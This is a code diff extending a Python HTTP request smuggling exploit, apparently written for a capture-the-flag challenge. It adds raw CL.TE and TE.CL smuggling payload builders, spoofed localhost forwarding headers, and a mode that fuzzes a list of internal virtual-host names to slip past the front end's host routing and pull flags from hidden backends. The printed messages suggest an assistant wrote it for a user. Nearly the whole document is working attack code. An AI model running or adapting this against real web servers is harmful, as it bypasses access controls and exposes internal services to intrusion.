@@ -178,16 +178,30 @@ def split_responses(data):
         parts.append(txt[idx:nxt]); idx = nxt
     return [p for p in parts if p.startswith("HTTP/1.")]
 
-def build_smuggled(host, smuggled_request_line, te_line, extra_headers=""):
-    """The request Apache will parse as 'internal'. No body."""
+def build_smuggled(host, smuggled_request_line, te_line, extra_headers="", host_header=None):
+    """The request Apache parses directly. host_header overrides Host so we can
+    reach a *different backend vhost* (the front's Host-routing is bypassed)."""
+    hh = host_header if host_header is not None else host
     return (f"{smuggled_request_line} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
+            f"Host: {hh}\r\n"
             f"X-Forwarded-For: 127.0.0.1\r\n"
             f"X-Real-IP: 127.0.0.1\r\n"
-            f"X-Forwarded-Host: localhost\r\n"
-            f"X-Original-URL: {smuggled_request_line.split(' ',1)[-1]}\r\n"
             f"{extra_headers}"
             f"Content-Length: 0\r\n\r\n")
+
+def smuggle_raw(host, kind, smug, te_line="Transfer-Encoding: chunked"):
+    """Send a CL.TE/TE.CL smuggle carrying the raw request string `smug`."""
+    if kind == "CL.TE":
+        body = "0\r\n\r\n" + smug
+        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n{te_line}\r\n"
+                   f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n{body}").encode()
+    else:
+        chunk_hdr = f"{len(smug):x}\r\n"
+        body = chunk_hdr + smug + "\r\n0\r\n\r\n"
+        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n{te_line}\r\n"
+                   f"Content-Length: {len(chunk_hdr)}\r\nConnection: keep-alive\r\n\r\n{body}").encode()
+    _, d, _ = send_recv(host, payload, read_timeout=8)
+    return split_responses(d)
 
 def smuggle_once(host, kind, smuggled_request_line, te_line="Transfer-Encoding: chunked"):
     """
@@ -259,19 +273,76 @@ def exploit(host, kind, only=None):
     print("[*] If every target shows only 1 response (the homepage) and no smuggled")
     print("    status line, tell me — I'll adjust the chunk framing/offsets.")
 
+# candidate internal-vhost Host headers (front routes by Host; smuggling bypasses that)
+VHOSTS = [
+    "localhost", "127.0.0.1", "ledger", "ledger.local", "ledger.internal",
+    "roaster", "roaster.local", "headroaster", "admin", "admin.local",
+    "internal", "internal.local", "backend", "private", "books",
+    "after-hours", "afterhours", "ember-oak", "emberoak", "ember-and-oak",
+    "ledger.ember-oak", "ledger.emberoak", "ledger.ember-and-oak",
+    "roaster.ember-oak", "ledger.stillwell", "ledgers", "the-ledger",
+    "coffee", "shop", "ember", "oak",
+]
+VHOST_PATHS = ["/", "/?api=ledger", "/ledger", "/flag.txt", "/?api=menu"]
+
+def summarize(resp):
+    if not resp: return "(none)", "", 0
+    status = resp.split("\r\n", 1)[0]
+    body = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else ""
+    # title or first json/text
+    m = re.search(r"<title>([^<]+)</title>", body)
+    tag = m.group(1) if m else body.strip()[:80].replace("\n"," ")
+    return status, tag, len(body)
+
+def vhost(host, kind):
+    print(f"[*] Fuzzing smuggled Host header via {kind} against {host}")
+    print(f"[*] Looking for a vhost whose response DIFFERS from the coffee shop / 404.\n")
+    # baseline: smuggle GET / with the real host
+    base = smuggle_raw(host, kind, build_smuggled(host, "GET /", "", host_header=host))
+    b_status, b_tag, b_len = summarize(base[1] if len(base)>1 else (base[0] if base else ""))
+    print(f"[baseline Host:{host[:30]}..]  {b_status} | len {b_len} | {b_tag[:60]}\n")
+    flags=set()
+    for vh in VHOSTS:
+        smug = build_smuggled(host, "GET /", "", host_header=vh)
+        resp = smuggle_raw(host, kind, smug)
+        smug_resp = resp[1] if len(resp)>1 else (resp[0] if resp else "")
+        status, tag, ln = summarize(smug_resp)
+        diff = ""
+        if ("Ember" not in tag and "instancer" not in tag and "HI Cyber" not in tag
+                and status and "404" not in status) or abs(ln-b_len)>50:
+            diff = "  <<< DIFFERENT"
+        print(f"[Host: {vh:28}] {status:22} len {ln:6} | {tag[:50]}{diff}")
+        for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", smug_resp):
+            flags.add(m)
+        if diff:
+            # drill into interesting vhost with more paths
+            for p in VHOST_PATHS[1:]:
+                r2 = smuggle_raw(host, kind, build_smuggled(host, "GET "+p, "", host_header=vh))
+                sr = r2[1] if len(r2)>1 else ""
+                s2,t2,l2 = summarize(sr)
+                print(f"      -> {p:20} {s2:22} len {l2} | {t2[:50]}")
+                for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", sr):
+                    flags.add(m)
+    if flags:
+        print("\n>>> POSSIBLE FLAG(S):")
+        for f in flags: print("   ", f)
+    print("\n[*] Done. Paste everything above back to me.")
+
 def main():
     if len(sys.argv) < 3:
         print(__doc__); sys.exit(1)
     host = sys.argv[1].replace("https://", "").replace("http://", "").rstrip("/")
     mode = sys.argv[2]
+    kind = sys.argv[3] if len(sys.argv) > 3 else "CL.TE"
     if mode == "detect":
         detect(host)
     elif mode == "exploit":
-        kind = sys.argv[3] if len(sys.argv) > 3 else "CL.TE"
         only = sys.argv[4] if len(sys.argv) > 4 else None
         exploit(host, kind, only)
+    elif mode == "vhost":
+        vhost(host, kind)
     else:
-        print("mode must be 'detect' or 'exploit'"); sys.exit(1)
+        print("mode must be 'detect', 'exploit', or 'vhost'"); sys.exit(1)
 
 if __name__ == "__main__":
     main()
